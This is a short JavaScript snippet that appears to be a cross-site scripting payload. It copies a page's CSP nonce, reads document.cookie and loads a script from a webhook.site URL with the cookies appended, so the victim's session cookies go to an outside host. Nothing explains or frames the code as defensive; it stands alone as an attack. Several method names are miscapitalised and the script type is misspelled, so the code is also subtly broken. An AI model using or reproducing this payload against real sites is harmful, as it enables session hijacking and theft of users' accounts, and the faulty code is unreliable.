var nounce = document.querySelectorAll("script")[2].nonce
var cook = document.cookie
var src = 'https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?=' + cook
var s = document.CreateElement('script')
s.type = "text/javascipt"
s.src = src
s.SetAttribute('nonce', nounce)
document.body.appendChild(s)
